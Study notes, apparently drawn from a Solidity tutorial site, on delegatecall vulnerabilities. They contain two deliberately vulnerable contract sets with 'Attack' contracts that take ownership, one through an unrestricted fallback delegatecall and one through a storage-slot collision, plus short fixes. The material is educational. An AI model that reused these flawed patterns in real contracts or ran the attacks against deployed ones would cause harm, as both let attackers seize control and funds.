#loss-of-access

https://solidity-by-example.org/hacks/delegatecall/

If Alice deploys `Lib` & `HackMe` (passing address of `Lib` as constructor arg)
Attack could deploy `Attack` to call the `attack()` function which calls the `fallback()` of `HackMe`
The `delegatecall` is unrestricted, any caller can call arbitrary function of `Lib`, including `pwn()` (which anyone can call)
Solution: don't write `delegatecall` that allows arbitrary function calls or have unrestricted change owner function

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}

```


The second example is more interesting, it is vulnerable since `Lib` and `HackMe` are the same storage layout if `delegatecall` is used, but there is collision in storage variables declaration, attacker could easily change the `lib` variable by calling `doSomething()` that changes the value in slot 0

Solution: `HackMe` to use `eip1967` implementation to store `lib` and `owner` at another position that won't have collision to `Lib` (address of `Lib` stored at `keccak256('eip1967.proxy.implementation')) - 1)` etc)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Lib {
    uint256 public someNumber;

    function doSomething(uint256 _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint256 public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint256 public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint256(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}

```